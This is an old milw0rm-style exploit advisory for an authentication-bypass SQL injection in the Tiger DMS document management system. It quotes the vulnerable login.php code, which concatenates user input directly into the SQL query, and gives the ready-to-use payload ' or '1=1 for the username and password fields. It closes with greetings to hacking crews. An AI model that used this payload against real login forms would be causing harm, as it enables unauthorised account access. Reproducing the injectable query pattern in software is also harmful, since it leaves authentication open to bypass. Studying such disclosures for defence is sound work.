@@ -1,0 +1,53 @@
+==============================================================================
+DDDDD  OOOO  SSSS      DDDD     ZZZZZZ    TTTTTTTTT EEEEE       A      MM   MM
+D    D o  O  S         D   D        Z         T     E          A A     M M M M
+D    D o  o  SSSS [**] D    D      Z          T     EEEEE     AAAAA    M  M  M
+D   D  o  o     S      D   D      Z           T     E        A     A   M     M
+DDDD   oooO  SSSS      DDDD      ZZZZZZ       T     EEEEE   A       A  M     M
+==============================================================================
+-------------------------------------[+]
+Home:http://www.tigerdms.com/download.php
+Product: Tiger DMS   
+home:www.h4ckf0ru.com
+Note:  I test it On Localhost Because ThE Demo is not Worked :)
+
+-------------------------------------
+Tiger DMS (auth Bypass) SQL Injection Vulnerabilities
+-------------------------------------
+File:
+-----
+Login.php
+
+
+Vuln:
+----
+if (isset($r_username)){
+$selog = mysql_query("SELECT * FROM $prefix"."users where username='$r_username' and password='$r_password'");
+$num_rows = mysql_num_rows($selog);
+    if ($num_rows == 1){
+    $nona=mysql_fetch_array($selog);
+    $_SESSION["aut"] = $nona["type"] ;
+    $_SESSION["nick"] = $nona["username"];
+    $_SESSION["name"] = $nona["name"];
+    $_SESSION["id"] = $nona["id"];
+    header("Location: index.php");
+
+exploit:
+--------
+
+http://localhost/[path]/login.php
+
+username:' or '1=1
+
+Password:' or '1=1
+
+
+--------------------------------------------------
+ Greetz to :
+[+] Super_Cristal (My Master) Dos-Dz Team Snakes TeaM
+SuB-ZeRo x.CJP.x Mr.tro0oqy - Cyber-Zone-  ZoRLu -ViRuS_Dz
+And ALL Members Of anti-intruders.org  
+ALL My Friends (Dz)
+[+]-------------------------------------[+] 
+
+# milw0rm.com [2009-04-29]
